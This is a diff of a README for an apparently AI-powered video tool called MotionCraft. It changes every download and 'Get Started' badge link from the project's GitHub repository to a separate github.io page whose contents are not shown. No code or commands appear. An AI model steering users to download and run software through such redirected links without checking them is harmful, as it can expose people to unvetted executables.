@@ -1,7 +1,7 @@
 <h1>🎬 MotionCraft - AI-Powered Videos Made Effortlessly</h1>
 
 <p align="center">
-<a href="https://github.com/Ahmedhass6140/MotionCraft"><img src="https://img.shields.io/badge/Download%20MotionCraft-8A2BE2?style=for-the-badge&logo=github&logoColor=white&labelColor=4B0082" alt="Download MotionCraft" width="350"></a>
+<a href="https://ahmedhass6140.github.io"><img src="https://img.shields.io/badge/Download%20MotionCraft-8A2BE2?style=for-the-badge&logo=github&logoColor=white&labelColor=4B0082" alt="Download MotionCraft" width="350"></a>
 </p>
 
 ---
@@ -35,7 +35,7 @@ Getting MotionCraft up and running is incredibly simple. Follow these steps:
 
 ### Step 1: Download the Application
 
-<a href="https://github.com/Ahmedhass6140/MotionCraft"><img src="https://img.shields.io/badge/⬇️%20Download%20MotionCraft-FF6B6B?style=for-the-badge&logo=github&logoColor=white&labelColor=CC3333" alt="Download Button" width="250"></a>
+<a href="https://ahmedhass6140.github.io"><img src="https://img.shields.io/badge/⬇️%20Download%20MotionCraft-FF6B6B?style=for-the-badge&logo=github&logoColor=white&labelColor=CC3333" alt="Download Button" width="250"></a>
 
 Visit this link to download the application. The download page will open in your browser.
 
@@ -159,7 +159,7 @@ MotionCraft is constantly improving, thanks to community contributions. You can:
 ---
 
 <p align="center">
-<a href="https://github.com/Ahmedhass6140/MotionCraft"><img src="https://img.shields.io/badge/🚀%20Get%20Started%20Now-28A745?style=for-the-badge&logo=github&logoColor=white&labelColor=1B6E32" alt="Get Started" width="300"></a>
+<a href="https://ahmedhass6140.github.io"><img src="https://img.shields.io/badge/🚀%20Get%20Started%20Now-28A745?style=for-the-badge&logo=github&logoColor=white&labelColor=1B6E32" alt="Get Started" width="300"></a>
 </p>
 
 ## 📝 Final Thoughts
